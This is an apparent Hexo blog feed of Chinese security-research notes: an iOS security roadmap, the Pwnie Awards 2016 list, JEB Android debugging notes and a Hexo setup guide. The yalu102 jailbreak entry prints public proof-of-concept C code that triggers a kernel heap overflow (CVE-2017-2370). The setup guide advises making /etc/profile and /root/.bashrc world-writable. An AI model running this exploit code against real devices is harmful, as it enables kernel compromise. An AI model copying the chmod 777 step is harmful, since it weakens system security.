      &lt;h3 id=&quot;《C-安全编程》–-第五章：整数安全&quot;&gt;&lt;a href=&quot;#《C-安全编程》–-第五章：整数安全&quot; class=&quot;headerlink&quot; title=&quot;《C++安全编程》– 第五章：整数安全&quot;&gt;&lt;/a&gt;《C++安全编程》– 第五章：整数安全&lt;/h3&gt;&lt;ul&gt;
&lt;l
    
    </summary>
    
      <category term="《C++安全编程》" scheme="http://yoursite.com/categories/%E3%80%8AC-%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B%E3%80%8B/"/>
    
    
      <category term="读书笔记" scheme="http://yoursite.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="熟悉" scheme="http://yoursite.com/tags/%E7%86%9F%E6%82%89/"/>
    
  </entry>
  
  <entry>
    <title>iOS RoadMap</title>
    <link href="http://yoursite.com/2017/02/08/iOS-roadMap/"/>
    <id>http://yoursite.com/2017/02/08/iOS-roadMap/</id>
    <published>2017-02-08T05:58:07.000Z</published>
    <updated>2017-02-09T09:39:39.000Z</updated>
    
    <content type="html"><![CDATA[<p>学习iOS安全的技术路线，分为：开发，工具，iOS安全模块，漏洞利用， 漏洞挖掘 5个模块。<br>(模块会发生变动)</p>
<a id="more"></a>
<p><img src="/include/img/iOS.jpg" alt="sdf"></p>
<h3 id="开发篇"><a href="#开发篇" class="headerlink" title="开发篇"></a>开发篇</h3><ol>
<li>语言 （swift, <a href="http://zh-google-styleguide.readthedocs.io/en/latest/google-objc-styleguide/contents/" target="_blank" rel="external">object-C</a>）</li>
<li>tweak</li>
<li>系统调用，开发模块(ioKit，消息响应等)</li>
</ol>
<h3 id="工具篇"><a href="#工具篇" class="headerlink" title="工具篇"></a>工具篇</h3><ol>
<li>砸壳工具</li>
<li>静态分析工具</li>
<li>动态调试工具</li>
<li>其他工具</li>
<li>脚本</li>
</ol>
<h3 id="iOS安全摸块"><a href="#iOS安全摸块" class="headerlink" title="iOS安全摸块"></a>iOS安全摸块</h3><ol>
<li>APP格式/组成</li>
<li>静态分析方法 (Arm64)</li>
<li><a href="http://bbs.iosre.com/t/debugserver-lldb-gdb/65" target="_blank" rel="external">动态调试方法</a><ol>
<li>应用调试</li>
<li>框架调试</li>
<li>内核调试</li>
</ol>
</li>
<li>重打包</li>
<li>砸壳原理</li>
</ol>
<h3 id="系统漏洞模块"><a href="#系统漏洞模块" class="headerlink" title="系统漏洞模块"></a>系统漏洞模块</h3><ol>
<li>提权</li>
<li>远程</li>
<li>越狱</li>
</ol>
<p>2017年春节后，蒸米在其 github 中发布一篇2016 iOS漏洞总结的文章，里面介绍的都是2016年的精华漏洞。<br><a href="/include/txt/2016年iOS公开可利用漏洞总结_CN.docx">2016年iOS公开可利用漏洞总结_CN</a></p>
<p>Apple 漏洞奖励计划</p>
<table>
<thead>
<tr>
<th>赏金类型</th>
<th>奖励金额</th>
</tr>
</thead>
<tbody>
<tr>
<td>安全启动固件组件</td>
<td>最高$200000</td>
</tr>
<tr>
<td>保护机密材料提取的安全协议处理器</td>
<td>最高$100000</td>
</tr>
<tr>
<td>执行任意代码内核权限</td>
<td>最高$50000</td>
</tr>
<tr>
<td>在苹果服务器上未经授权擅自访问iCloud帐户数据</td>
<td>最高$50000</td>
</tr>
<tr>
<td>在沙箱外对沙箱内的用户数据进行访问</td>
<td>最高$25000</td>
</tr>
</tbody>
</table>
<h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><h3 id="学习资源"><a href="#学习资源" class="headerlink" title="学习资源"></a>学习资源</h3><p><a href="http://resources.infosecinstitute.com/ios-application-security-part-1-setting-up-a-mobile-pentesting-platform/" target="_blank" rel="external">英文</a><br><a href="http://security.ios-wiki.com/" target="_blank" rel="external">iOS Security 中文</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;学习iOS安全的技术路线，分为：开发，工具，iOS安全模块，漏洞利用， 漏洞挖掘 5个模块。&lt;br&gt;(模块会发生变动)&lt;/p&gt;
    
    </summary>
    
      <category term="研究" scheme="http://yoursite.com/categories/categories-research/"/>
    
    
      <category term="熟悉" scheme="http://yoursite.com/tags/%E7%86%9F%E6%82%89/"/>
    
      <category term="ios" scheme="http://yoursite.com/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>2016 Pwnie Awards</title>
    <link href="http://yoursite.com/2017/02/08/2016-Pwnie-Awards/"/>
    <id>http://yoursite.com/2017/02/08/2016-Pwnie-Awards/</id>
    <published>2017-02-08T05:01:24.000Z</published>
    <updated>2017-02-09T06:23:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>2016 Black Hat重点记录</p>
<h3 id="精品漏洞"><a href="#精品漏洞" class="headerlink" title="精品漏洞"></a>精品漏洞</h3><a id="more"></a>
<p>Pwnie Awards 2016获奖名单揭晓</p>
<p>素有网络安全奥斯卡之称的Pwnie Awards正式公布各个奖项的归属。有关这个奖的分量就不必再多说了，我们直接来看获奖名单。</p>
<p><strong>最佳服务器BUG奖</strong>（Pwnie for Best Server-Side Bug）：Cisco ASA IKEv1/IKEv2 Fragmentation Heap Buffer Overflow缓冲溢出（CVE-2016-1287）。传说中最有趣、技术上精制复杂的服务器端漏洞利用。</p>
<p><strong>最佳客户端BUG奖</strong>（Pwnie for Best Client-Side Bug）：glibc getsddrinfo堆栈缓冲溢出（CVE-2015-7547）。</p>
<p><strong>最佳提权BUG奖</strong>（Pwnie for Best Privilege Escalation Bug）：Widevine QSEE TrustZone Privilege Escalation（CVE-2015-6639），就是前一阵影响Android系统高通芯片TrustZone的漏洞。</p>
<p><strong>最佳加密攻击奖</strong>（Pwnie for Best Crytographic Attack）：SSLv2 Crypto攻击（DROWN Attack）（CVE-2016-0800）。这个奖项是今年首度出现的，授予那些采用新奇的方式来打破加密系统的安全研究人员。</p>
<p><strong>最炫Hack奖</strong>（Pwnie for Best Junk or Stunt Hack）：远程劫持高速公路上的Jeep——去年比较火热针对切诺基的远程攻击。这个奖的英文原名其实很有趣，各位可以体会以下，有关这个奖的描述是这样的：“授予研究人员，及他们的公关团队，还有参与其中的记者，为其产生的超高公众影响力，甚至可能致许多不懂技术的朋友和家人会惊慌失措打来电话的技术。”</p>
<p><strong>最佳品牌奖</strong>（Pwnie for Best Branding）：Mousejack无线键盘注入BUG。这个奖授予话最大努力解释和宣传其发现的安全漏洞的企业。</p>
<p><strong>史诗成就奖</strong>（Pwnie for Epic Achievement）：Tavis Ormandy（针对他去年侵入绝大部分反病毒程度而颁发）。又一个全新的奖项，听着都感觉很高端，这个奖专门颁给那些获得前所未有的“成绩”（notoriery）的研究人员。</p>
<p><strong>最佳创新研究奖</strong>（Pwnie for Most Innovative Research）： Dedup Est Machina：Memory Deduplication as an Advanced Exploitation Vector（将内存重复数据删除作为高级利用向量，这是篇论文）。这个奖是颁给那些公布最有趣研究，即便研究还没实现的研究人员。</p>
<p><strong>最过分夸大BUG奖</strong>（Pwnie for Most Over-hyped Bug）：Badlock（CVE-2016-0128）。这个奖颁给被媒体过分关注，但实际上根本就没那么危险的安全漏洞。</p>
<p>最佳歌曲奖（Pwnie for Best Song）：Cyber-lair，来自Katie Moussouris。</p>
<p><strong>史诗级0wnage奖</strong>（Pwnie for Epic 0wnage）：Juniper Backdoor后门。此奖授予对企业或产品产生极大危害的研究人员或安全漏洞。</p>
<p><strong>终身成就奖</strong>：Mudge，Peiter C.Zatko。长期以来从事漏洞研究的教育专家、在安全行业有较大影响力，先前曾领导DARPA网络安全项目。</p>
<h3 id="Apple-漏洞奖励计划"><a href="#Apple-漏洞奖励计划" class="headerlink" title="Apple 漏洞奖励计划"></a>Apple 漏洞奖励计划</h3><table>
<thead>
<tr>
<th>赏金类型</th>
<th>奖励金额</th>
</tr>
</thead>
<tbody>
<tr>
<td>安全启动固件组件</td>
<td>最高$200000</td>
</tr>
<tr>
<td>保护机密材料提取的安全协议处理器</td>
<td>最高$100000</td>
</tr>
<tr>
<td>执行任意代码内核权限</td>
<td>最高$50000</td>
</tr>
<tr>
<td>在苹果服务器上未经授权擅自访问iCloud帐户数据</td>
<td>最高$50000</td>
</tr>
<tr>
<td>在沙箱外对沙箱内的用户数据进行访问</td>
<td>最高$25000</td>
</tr>
</tbody>
</table>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2016 Black Hat重点记录&lt;/p&gt;
&lt;h3 id=&quot;精品漏洞&quot;&gt;&lt;a href=&quot;#精品漏洞&quot; class=&quot;headerlink&quot; title=&quot;精品漏洞&quot;&gt;&lt;/a&gt;精品漏洞&lt;/h3&gt;
    
    </summary>
    
      <category term="漏洞" scheme="http://yoursite.com/categories/categories-exploit/"/>
    
    
      <category term="blackhat-2016" scheme="http://yoursite.com/tags/blackhat-2016/"/>
    
  </entry>
  
  <entry>
    <title>yalu102 越狱</title>
    <link href="http://yoursite.com/2017/02/07/yalu102-%E8%B6%8A%E7%8B%B1/"/>
    <id>http://yoursite.com/2017/02/07/yalu102-越狱/</id>
    <published>2017-02-07T07:56:37.000Z</published>
    <updated>2017-02-09T06:23:30.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="基本信息："><a href="#基本信息：" class="headerlink" title="基本信息："></a>基本信息：</h3><p>luca 发布了ios 10.2 版本的开源越狱工具。<br>yalu 102 repo: <a href="https://github.com/kpwn/yalu102" target="_blank" rel="external">https://github.com/kpwn/yalu102</a><br>zhengmin repo:<a href="https://github.com/zhengmin1989/yalu102.git" target="_blank" rel="external">https://github.com/zhengmin1989/yalu102.git</a><br>CVE: CVE-2017-2370</p>
<a id="more"></a>
<h3 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h3><p>漏洞在mach_voucher_extract_attr_recipe_trap(struct mach_voucher_extract_attr_recipe_args *args)函数中, 因为错误的将用户态指针(args-&gt;recipe_size)当成了长度值， 导致内核堆溢出漏洞。<br>因为拷贝的数据源和拷贝的长度都是用户可控的所以利用比较容易。</p>
<h3 id="简易POC"><a href="#简易POC" class="headerlink" title="简易POC:"></a>简易POC:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div></pre></td><td class="code"><pre><div class="line">// ianbeer</div><div class="line">#if 0</div><div class="line">iOS/MacOS kernel memory corruption due to userspace pointer being used as a length</div><div class="line"></div><div class="line">mach_voucher_extract_attr_recipe_trap is a mach trap which can be called from any context</div><div class="line"></div><div class="line">Here&apos;s the code:</div><div class="line"></div><div class="line">    kern_return_t</div><div class="line">    mach_voucher_extract_attr_recipe_trap(struct mach_voucher_extract_attr_recipe_args *args)</div><div class="line">    &#123;</div><div class="line">        ipc_voucher_t voucher = IV_NULL;</div><div class="line">        kern_return_t kr = KERN_SUCCESS;</div><div class="line">        mach_msg_type_number_t sz = 0;</div><div class="line"></div><div class="line">        if (copyin(args-&gt;recipe_size, (void *)&amp;sz, sizeof(sz)))     &lt;---------- (a)</div><div class="line">            return KERN_MEMORY_ERROR;</div><div class="line"></div><div class="line">        if (sz &gt; MACH_VOUCHER_ATTR_MAX_RAW_RECIPE_ARRAY_SIZE)</div><div class="line">            return MIG_ARRAY_TOO_LARGE;</div><div class="line"></div><div class="line">        voucher = convert_port_name_to_voucher(args-&gt;voucher_name);</div><div class="line">        if (voucher == IV_NULL)</div><div class="line">            return MACH_SEND_INVALID_DEST;</div><div class="line"></div><div class="line">        mach_msg_type_number_t __assert_only max_sz = sz;</div><div class="line"></div><div class="line">        if (sz &lt; MACH_VOUCHER_TRAP_STACK_LIMIT) &#123;</div><div class="line">            /* keep small recipes on the stack for speed */</div><div class="line">            uint8_t krecipe[sz];</div><div class="line">            if (copyin(args-&gt;recipe, (void *)krecipe, sz)) &#123;</div><div class="line">                kr = KERN_MEMORY_ERROR;</div><div class="line">                goto done;</div><div class="line">            &#125;</div><div class="line">            kr = mach_voucher_extract_attr_recipe(voucher, args-&gt;key,</div><div class="line">                    (mach_voucher_attr_raw_recipe_t)krecipe, &amp;sz);</div><div class="line">            assert(sz &lt;= max_sz);</div><div class="line"></div><div class="line">            if (kr == KERN_SUCCESS &amp;&amp; sz &gt; 0)</div><div class="line">                kr = copyout(krecipe, (void *)args-&gt;recipe, sz);</div><div class="line">        &#125; else &#123;</div><div class="line">            uint8_t *krecipe = kalloc((vm_size_t)sz);                 &lt;---------- (b)</div><div class="line">            if (!krecipe) &#123;</div><div class="line">                kr = KERN_RESOURCE_SHORTAGE;</div><div class="line">                goto done;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            if (copyin(args-&gt;recipe, (void *)krecipe, args-&gt;recipe_size)) &#123;         &lt;----------- (c)</div><div class="line">                kfree(krecipe, (vm_size_t)sz);</div><div class="line">                kr = KERN_MEMORY_ERROR;</div><div class="line">                goto done;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            kr = mach_voucher_extract_attr_recipe(voucher, args-&gt;key,</div><div class="line">                    (mach_voucher_attr_raw_recipe_t)krecipe, &amp;sz);</div><div class="line">            assert(sz &lt;= max_sz);</div><div class="line"></div><div class="line">            if (kr == KERN_SUCCESS &amp;&amp; sz &gt; 0)</div><div class="line">                kr = copyout(krecipe, (void *)args-&gt;recipe, sz);</div><div class="line">            kfree(krecipe, (vm_size_t)sz);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        kr = copyout(&amp;sz, args-&gt;recipe_size, sizeof(sz));</div><div class="line"></div><div class="line">    done:</div><div class="line">        ipc_voucher_release(voucher);</div><div class="line">        return kr;</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">Here&apos;s the argument structure (controlled from userspace)</div><div class="line"></div><div class="line">    struct mach_voucher_extract_attr_recipe_args &#123;</div><div class="line">        PAD_ARG_(mach_port_name_t, voucher_name);</div><div class="line">        PAD_ARG_(mach_voucher_attr_key_t, key);</div><div class="line">        PAD_ARG_(mach_voucher_attr_raw_recipe_t, recipe);</div><div class="line">        PAD_ARG_(user_addr_t, recipe_size);</div><div class="line">    &#125;;</div><div class="line"></div><div class="line">recipe and recipe_size are userspace pointers.</div><div class="line"></div><div class="line">At point (a) four bytes are read from the userspace pointer recipe_size into sz.</div><div class="line"></div><div class="line">At point (b) if sz was less than MACH_VOUCHER_ATTR_MAX_RAW_RECIPE_ARRAY_SIZE (5120) and greater than MACH_VOUCHER_TRAP_STACK_LIMIT (256)</div><div class="line">sz is used to allocate a kernel heap buffer.</div><div class="line"></div><div class="line">At point (c) copyin is called again to copy userspace memory into that buffer which was just allocated, but rather than passing sz (the</div><div class="line">validate size which was allocated) args-&gt;recipe_size is passed as the size. This is the userspace pointer *to* the size, not the size!</div><div class="line"></div><div class="line">This leads to a completely controlled kernel heap overflow.</div><div class="line"></div><div class="line">Tested on MacOS Sierra 10.12.1 (16B2555)</div><div class="line">#endif</div><div class="line"></div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">#include &lt;mach/mach.h&gt;</div><div class="line">#include &lt;mach/mach_vm.h&gt;</div><div class="line">#include &lt;mach/mach_error.h&gt;</div><div class="line">#include &lt;mach/mach_traps.h&gt;</div><div class="line">#include &lt;mach/mach_voucher_types.h&gt;</div><div class="line"></div><div class="line">#include &lt;atm/atm_types.h&gt;</div><div class="line"></div><div class="line">mach_port_t get_voucher() &#123;</div><div class="line">  mach_voucher_attr_recipe_data_t r = &#123;</div><div class="line">    .key = MACH_VOUCHER_ATTR_KEY_ATM,</div><div class="line">    .command = MACH_VOUCHER_ATTR_ATM_CREATE</div><div class="line">  &#125;;</div><div class="line">  mach_port_t p = MACH_PORT_NULL;</div><div class="line">  kern_return_t err = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&amp;r, sizeof(r), &amp;p);</div><div class="line"></div><div class="line">  if (err != KERN_SUCCESS) &#123;</div><div class="line">    printf(&quot;failed to create voucher (%s)\n&quot;, mach_error_string(err));</div><div class="line">    exit(EXIT_FAILURE);</div><div class="line">  &#125;</div><div class="line">   printf(&quot;got voucher: %x\n&quot;, p);</div><div class="line"></div><div class="line">  return p;</div><div class="line">&#125;</div><div class="line"></div><div class="line">uint64_t map(uint64_t addr, uint64_t size) &#123;</div><div class="line">  uint64_t _addr = addr;</div><div class="line">  kern_return_t err = mach_vm_allocate(mach_task_self(), &amp;_addr, size, 0);</div><div class="line">  if (err != KERN_SUCCESS || _addr != addr) &#123;</div><div class="line">    printf(&quot;failed to allocate fixed mapping: %s\n&quot;, mach_error_string(err));</div><div class="line">    exit(EXIT_FAILURE);</div><div class="line">  &#125;</div><div class="line">  return addr;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main() &#123;</div><div class="line">  void* recipe_size = (void*)map(0x123450000, 0x1000);</div><div class="line">  *(uint64_t*)recipe_size = 0x1000;</div><div class="line"></div><div class="line">  uint64_t size = 0x1000000;</div><div class="line">  void* recipe = malloc(size);</div><div class="line">  memset(recipe, 0x41, size);</div><div class="line"></div><div class="line">  mach_port_t port = get_voucher();</div><div class="line">  kern_return_t err = mach_voucher_extract_attr_recipe_trap(</div><div class="line">      port,</div><div class="line">      1,</div><div class="line">      recipe,</div><div class="line">      recipe_size);</div><div class="line"></div><div class="line">  printf(&quot;%s\n&quot;, mach_error_string(err));</div><div class="line"></div><div class="line">  return 41;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>目前此漏洞已经在 macOS 10.12.3 和 iOS 10.2.1 上被修复。</p>
<h3 id="测试："><a href="#测试：" class="headerlink" title="测试："></a>测试：</h3><p>在iphone6 10.2版本的手机上使用 zhengmin 编译的ipa 可以越狱但是不稳定，重启以后cydia 闪退。</p>
<p>Supported Devices and iOS versions</p>
<table>
<thead>
<tr>
<th>Device</th>
<th>Version</th>
</tr>
</thead>
<tbody>
<tr>
<td>iPad Pro</td>
<td>iOS 10.0.0 -&gt; iOS 10.2</td>
</tr>
<tr>
<td>iPhone 6S</td>
<td>iOS 10.0.0 -&gt; iOS 10.2</td>
</tr>
<tr>
<td>iPhone SE</td>
<td>iOS 10.0.0 -&gt; iOS 10.2</td>
</tr>
<tr>
<td>iPhone 5S</td>
<td>iOS 10.0.0 -&gt; iOS 10.2</td>
</tr>
<tr>
<td>iPad Air</td>
<td>iOS 10.0.0 -&gt; iOS 10.2</td>
</tr>
<tr>
<td>iPad Mini 2</td>
<td>iOS 10.0.0 -&gt; iOS 10.2</td>
</tr>
<tr>
<td>iPhone 6</td>
<td>iOS 10.0.0 -&gt; iOS 10.2</td>
</tr>
<tr>
<td>iPad Mini 3</td>
<td>iOS 10.0.0 -&gt; iOS 10.2</td>
</tr>
<tr>
<td>iPad Air 2</td>
<td>iOS 10.0.0 -&gt; iOS 10.2</td>
</tr>
<tr>
<td>iPad Mini 4</td>
<td>iOS 10.0.0 -&gt; iOS 10.2</td>
</tr>
<tr>
<td>iPod touch (6G)</td>
<td>iOS 10.0.0 -&gt; iOS 10.2</td>
</tr>
</tbody>
</table>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;基本信息：&quot;&gt;&lt;a href=&quot;#基本信息：&quot; class=&quot;headerlink&quot; title=&quot;基本信息：&quot;&gt;&lt;/a&gt;基本信息：&lt;/h3&gt;&lt;p&gt;luca 发布了ios 10.2 版本的开源越狱工具。&lt;br&gt;yalu 102 repo: &lt;a href=&quot;https://github.com/kpwn/yalu102&quot;&gt;https://github.com/kpwn/yalu102&lt;/a&gt;&lt;br&gt;zhengmin repo:&lt;a href=&quot;https://github.com/zhengmin1989/yalu102.git&quot;&gt;https://github.com/zhengmin1989/yalu102.git&lt;/a&gt;&lt;br&gt;CVE: CVE-2017-2370&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞" scheme="http://yoursite.com/categories/categories-exploit/"/>
    
    
      <category term="了解" scheme="http://yoursite.com/tags/%E4%BA%86%E8%A7%A3/"/>
    
      <category term="ios" scheme="http://yoursite.com/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>happy new year</title>
    <link href="http://yoursite.com/2017/02/04/happy-new-year/"/>
    <id>http://yoursite.com/2017/02/04/happy-new-year/</id>
    <published>2017-02-03T17:32:43.000Z</published>
    <updated>2017-02-03T17:33:07.000Z</updated>
    
    <summary type="html">
    
    </summary>
    
      <category term="生活" scheme="http://yoursite.com/categories/categories-life/"/>
    
    
  </entry>
  
  <entry>
    <title>jeb-v2.2.7真机调试 APK(nodebug)</title>
    <link href="http://yoursite.com/2017/01/24/jeb-v2-2-7%E7%9C%9F%E6%9C%BA%E8%B0%83%E8%AF%95-APK-nodebug/"/>
    <id>http://yoursite.com/2017/01/24/jeb-v2-2-7真机调试-APK-nodebug/</id>
    <published>2017-01-23T16:31:49.000Z</published>
    <updated>2017-02-12T12:53:44.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="JEB2-2-7-调试阿里2016移动安全-第三题-app部分"><a href="#JEB2-2-7-调试阿里2016移动安全-第三题-app部分" class="headerlink" title="JEB2.2.7 调试阿里2016移动安全 第三题-app部分"></a>JEB2.2.7 调试阿里2016移动安全 第三题-app部分</h2><hr>
<p>记录 在动态调试 app 中 gif库解析漏洞是使用的工具 和 遇到的一些坑， 分析漏洞只是顺带一提不作为重点。</p>
<a id="more"></a>
<blockquote>
<p>说明：</p>
<pre><code>1. app debugable 开关关闭。我采用刷ROM(userdebug 版本)的方式绕过。
2. 测试手机: Nexus 5x
3. Android 版本: 6.0.1
</code></pre></blockquote>
<script>
    if( prompt("Please input password") !== String(111) )
    {
        alert('密码错误！');
        self.location='https://floatingguy.github.io/about/';
        // history.back();
    } else {
        alert("密码正确");
    }
</script>

<hr>
<p>工具：jeb-v2.2.7<br>需要配置的环境变量：JEB_HOME 和 ANDROID_SDK。</p>
<h3 id="bug-统计"><a href="#bug-统计" class="headerlink" title="bug 统计"></a>bug 统计</h3><ol>
<li>jeb动态调试BUG:<br> ANDROID_SDK配置完全正确，但是每次 debug 时都显示<code>找不到 ADB</code>。</li>
</ol>
<p>原因：我是通过Alfred 通过开启的 jeb.app， 这种方式访问不到环境变量所以找不到 ADB。<br>解决：</p>
<pre><code>1. 可以通过写脚本，每次在终端执行  （完成 jeb_debug...sh）
2. 到 jeb目录下执行 jeb_mac.sh
</code></pre><h3 id="jeb注意事项："><a href="#jeb注意事项：" class="headerlink" title="jeb注意事项："></a>jeb注意事项：</h3><pre><code>1. 只有在 bytecode view时才可以 debug
2. 视频中可以从 art 指令直接跳转到 so汇编中执行，但是我本次测试时不行。。。
3. localval 窗口显示的只有 数字没有字符不知道怎么对应。
</code></pre><h3 id="jeb-快捷键："><a href="#jeb-快捷键：" class="headerlink" title="jeb 快捷键："></a>jeb 快捷键：</h3><pre><code>* 下断点：cmd+B
* 反编译：q
* 后退/前进： alt+ ←/→
</code></pre><h2 id="题目注意事项"><a href="#题目注意事项" class="headerlink" title="题目注意事项"></a>题目注意事项</h2><p>在上传 gif 解析时，app中将 URL 强制从<code>URLConnection</code>转换成了 <code>HTTPURLConnection</code>类型，所以我们json文件中的<code>address</code>值必须包含<code>http://</code>否则会抛出<code>MalformedURLException</code>异常</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.pnfsoftware.com/blog/jeb-android-debuggers/" target="_blank" rel="external">AN INTRODUCTION TO JEB ANDROID DEBUGGERS</a><br><a href="https://www.pnfsoftware.com/blog/category/jeb2/" target="_blank" rel="external">ADVANCED DEBUGGER USAGE VIA THE INTERPRETER</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;JEB2-2-7-调试阿里2016移动安全-第三题-app部分&quot;&gt;&lt;a href=&quot;#JEB2-2-7-调试阿里2016移动安全-第三题-app部分&quot; class=&quot;headerlink&quot; title=&quot;JEB2.2.7 调试阿里2016移动安全 第三题-app部分&quot;&gt;&lt;/a&gt;JEB2.2.7 调试阿里2016移动安全 第三题-app部分&lt;/h2&gt;&lt;hr&gt;
&lt;p&gt;记录 在动态调试 app 中 gif库解析漏洞是使用的工具 和 遇到的一些坑， 分析漏洞只是顺带一提不作为重点。&lt;/p&gt;
    
    </summary>
    
      <category term="研究" scheme="http://yoursite.com/categories/categories-research/"/>
    
    
      <category term="jeb" scheme="http://yoursite.com/tags/jeb/"/>
    
      <category term="动态调试" scheme="http://yoursite.com/tags/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/"/>
    
      <category term="Armv8-64" scheme="http://yoursite.com/tags/Armv8-64/"/>
    
  </entry>
  
  <entry>
    <title>配置hexo + github page 个人Blog</title>
    <link href="http://yoursite.com/2017/01/22/%E9%85%8D%E7%BD%AEhexo-github-page-%E4%B8%AA%E4%BA%BABlog/"/>
    <id>http://yoursite.com/2017/01/22/配置hexo-github-page-个人Blog/</id>
    <published>2017-01-22T04:52:26.000Z</published>
    <updated>2017-02-07T08:19:59.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基础配置（一）"><a href="#基础配置（一）" class="headerlink" title="基础配置（一）"></a>基础配置（一）</h2><h3 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h3><a id="more"></a>
<p>1.install nodejs-v6.9.4</p>
<pre><code>下载zip package
</code></pre><ol>
<li>安装Nodejs<br> ubuntu: <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install nodejs</div><div class="line"><span class="comment">#检查版本</span></div><div class="line">node -v</div></pre></td></tr></table></figure>
</li>
</ol>
<p>如果nodejs 版本不是 <strong>v6.9.4</strong>,那么需要去官网下载按照包：</p>
<p>安装release版 (Nodejs)[<a href="http://www.ctolib.com/topics-106467.html" target="_blank" rel="external">http://www.ctolib.com/topics-106467.html</a>]</p>
<blockquote>
<p>如果命令行下载不了 nodejs:<br>安装过程 官网下载好，解压。终端 mv node-v6.9.4-linux-x64 /opt/ 输入命令：sudo chmod 777 /etc/profile，进入目录下，备份一下，这里我是用 sublime text 打<br>开的，在末尾添加以下三行：</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">export</span> NODE_HOME=/opt/node-v6.9.4-linux-x64</div><div class="line"><span class="built_in">export</span> PATH=PATH:PATH:NODE_HOME/bin</div><div class="line"><span class="built_in">export</span> NODE_PATH=<span class="variable">$NODE_HOME</span>/lib/node_modules</div></pre></td></tr></table></figure>
<blockquote>
<p>之后按保存退出 在命令行输入：source /etc/profile，然后在命令行输入：node -v，返回版本信息v6.9.4，说明环境变量配置就生效了；但，你会发现进入root账户，改配置并没有生效 在命令行输入：sudo chmod 777 /root/.bashrc,进入所在目录，备份好文件，并在文件末尾加入一行source /etc/profile命令，保存。这样就大功告成了。 操作完后记得将权限改回去。</p>
</blockquote>
<p>3.install nodejs-legacy</p>
<pre><code>sudo apt-get install nodejs-legacy
</code></pre><p>4.install hexo</p>
